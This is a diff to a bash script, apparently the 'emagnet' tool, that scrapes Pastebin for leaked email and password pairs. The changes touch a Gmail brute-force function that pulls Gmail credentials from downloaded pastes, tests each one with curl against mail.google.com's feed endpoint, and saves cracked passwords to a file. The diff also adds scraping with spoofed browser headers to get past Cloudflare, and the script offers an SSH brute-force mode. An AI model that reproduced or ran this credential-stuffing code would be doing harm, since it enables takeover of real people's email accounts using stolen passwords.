@@ -192,7 +192,7 @@ emagnet_mustbefilled() {
 # After we downloaded and counted data we want to move all temporary files to all-files
 # and also because we dont want to count data from those files twice...
 emagnet_move_realtime() {
-         mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
+        # mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
          rm "$HOME/.config/emagnet/tmp/.emagnet" "$HOME/.config/emagnet/tmp/.emagnet1"  &> /dev/null
  }
 
@@ -742,16 +742,22 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
 
 emagnet_gmail_bruter() {
 if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
-grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt 
+
+  grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
+        |awk '{print $1}' \
+        |cut -d: -f2,3 \
+        |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v '/'|grep -i 'gmail.com' >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
+
 while read -r line; do
-attack=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o xml)
-mail="$(echo $line | cut -d: -f1)"
-password="$(echo $line | cut -d: -f2)"
-    if [[ -z "$attack" ]]; then
-         printf "[-] Wrong Password For $mail: \e[1;31m$password\e[0m\n"
-         echo -e "[-] $(date +%d/%m/%Y\ -\ %H:%M) -> Wrong Password For $mail $mail: \e[1;31m$password\e[0m" >> "$EMAGNETLOGS/failed-to-crack.txt"
+GMAIL_ATTACK=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o "xml")
+GMAIL_USER="$(echo $line | cut -d: -f1)"
+GMAIL_PASS="$(echo $line | cut -d: -f2)"
+
+    if [[ -z "$GMAIL_ATTACK" ]]; then
+         echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${GMAIL_USER}:${GMAIL_PASS}"
     fi
-      if [[ -n "$attack" ]]; then
+
+      if [[ -n "$GMAIL_ATTACK" ]]; then
          echo -e "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
          read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
          echo -e "================================================================"     >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
@@ -878,6 +884,7 @@ emagnet_main() {
 # emagnet-download since we just want to download new files that not already is in our all-files
       sed -i 's/^/https:\/\/pastebin.com\/raw\//g' "$HOME/.config/emagnet/tmp/.emagnet-download"
 
+
 #-----------------------------------------------------
 # If cloudfare is trigged, then we will do below 
 # - We wont be allowed to use wget without
@@ -886,6 +893,8 @@ emagnet_main() {
 # change this if you have a faster, better and more 
 # stable way to do this if cloudfare is triggered
 #-----------------------------------------------------
+curl -sL https://pastebin.com/|grep -io "What can I do to" &> /dev/null
+if [[ ${$?} -gt "0" ]]; then
 while read line; do
 curl -sL $PASTEBIN \
      -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H \
@@ -895,12 +904,12 @@ curl -sL $PASTEBIN \
      -H 'Cache-Control: max-age=0' \
      -H 'TE: Trailers' \
      -o $EMAGNETTEMP/$(echo $line|sed 's:..*/::');done < "$HOME/.config/emagnet/tmp/.emagnet-download2" &> /dev/null
-
+else
 # Downloading new pastes we found, no duplicates will be downloaded of course
-#     xargs -P "$(xargs --show-limits -s 1 2>&1|grep -i "parallelism"|awk '{print $8}')" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
+     xargs -P "$(xargs --show-limits -s 1 2>&1|grep -i "parallelism"|awk '{print $8}')" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
 #     xargs -P "8" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
-# Cleanup, we don't need these files after we downloaded them.
-      rm "$HOME/.config/emagnet/tmp/.emagnet-temp1" "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp3" &> /dev/null
+fi
+# Print TT nice
       tt="$(ls $EMAGNETTEMP| wc -l)"
 
 # Count stats and print them in realtime 
@@ -936,10 +945,10 @@ if [[ "$pt" -gt "0" ]] && [[ "$et" -gt "0" ]]; then
             echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m]\n"
             emagnet_move_realtime
             sleep 2
-              
+
                if [[ "$GBRUTEFORCE" = "true" ]]; then
                   printf "%64s \n\n" | tr ' ' '='
-                  printf "%17s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mI\e[0;32mL\E[1;31m\e[0m") ACCOUNTS\e[0m\n\n"
+                  printf "%16s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mI\e[0;32mL\E[1;31m\e[0m") ACCOUNTS\e[0m\n\n"
                   emagnet_gmail_bruter
                 elif [[ "$SBRUTEFORCE" = "true" ]]; then
                   emagnet_sshbruter
@@ -984,6 +993,10 @@ elif [[ "$pt" = "0" ]] && [[ "$et" = "0" ]] && [[ ${tt} = "0" ]]; then
             emagnet_move_realtime
             sleep 2
 fi
+
+# Cleanup, we don't need these files after we downloaded them but it must be done AFTER bruteforce and not before if bruteforce is triggered
+      rm "$HOME/.config/emagnet/tmp/.emagnet-temp1" "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp3" &> /dev/null
+
 }
 
 emagnet_run4ever() {
@@ -1243,19 +1256,21 @@ case "${1}" in
           emagnet_required_tools
           emagnet_iconnection
           emagnet_first_run
+
           sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' "$CONF"
           sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' "$CONF"
           sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' "$CONF"
           sed -i 's/IBRUTEFORCE=true/IBRUTEFORCE=false/g' "$CONF"
           sed -i 's/RBRUTEFORCE=true/RBRUTEFORCE=false/g' "$CONF"
+
           if [[ "$2" = "gmail" ]]; then
             sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' "$CONF"
             emagnet_conf
               if [[ "$GBRUTEFORCE" = "true" ]]; then
                emagnet_run4ever
                emagnet_gmail_bruter
-               mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
-              fi
+#               mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
+          fi
 
            elif [[ "$2" = "ssh" ]]; then
            sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
